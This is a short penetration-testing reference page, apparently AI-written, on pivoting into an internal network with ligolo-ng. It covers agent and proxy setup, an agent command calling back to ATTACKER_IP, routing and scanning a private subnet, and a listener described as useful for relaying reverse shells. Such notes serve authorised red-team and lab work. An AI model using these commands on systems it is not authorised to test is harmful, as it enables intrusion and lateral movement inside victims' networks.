# ligolo-ng

**Author:** Julien Bongars\
**Date:** 2026-08-26
**Path:**

---

> **EDITOR NOTE**
>
> This page was created 100% with AI as a disclosure.

TUN-based pivot. Agent on the compromised host, proxy on the attacker. Routes a whole subnet through a `ligolo` interface — easier than per-port forwards once you need to scan an internal range.

GitHub: https://github.com/nicocha30/ligolo-ng

## Attacker: TUN + proxy

```bash
# One-time: create the TUN (Linux)
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up

# Proxy (self-signed is fine in a lab)
./proxy -selfcert
# listens 11601/tcp by default
```

## Target: agent

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

Windows: same flags on `agent.exe`.

## Session

In the proxy console:

```txt
ligolo-ng » session          # pick the agent
ligolo-ng » ifconfig         # see the agent's interfaces
ligolo-ng » start            # bring the tunnel up
```

Route the internal net **on the attacker**:

```bash
sudo ip route add 172.16.1.0/24 dev ligolo
# then nmap / browser / rdp as if you were on that LAN
nmap -sT -Pn 172.16.1.10
```

## Listener (reverse: expose attacker port on the agent)

```txt
ligolo-ng » listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000
```

Agent host now accepts 8000 and forwards to the attacker — useful for reverse shells from a second internal box.

## vs chisel / SSH

- **ligolo-ng** — full TUN, native routing, good when you need to treat the internal net as local
- [chisel](./chisel.md) — HTTP/SSH tunnel, SOCKS, per-port `R:` forwards; no TUN
- [SSH tunneling](./port-forwarding.md) — `-D` SOCKS / `-L` / `-R` when OpenSSH is already there

Point scanners through SOCKS with [proxychains](./proxychains.md) when you use chisel/SSH instead of a TUN.

## Resources

- [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) — source and releases
- [chisel](./chisel.md) — HTTP tunnel / SOCKS pivot
- [SSH tunneling](./port-forwarding.md) — OpenSSH `-L`/`-R`/`-D`
- [proxychains](./proxychains.md) — send tools through a SOCKS listener
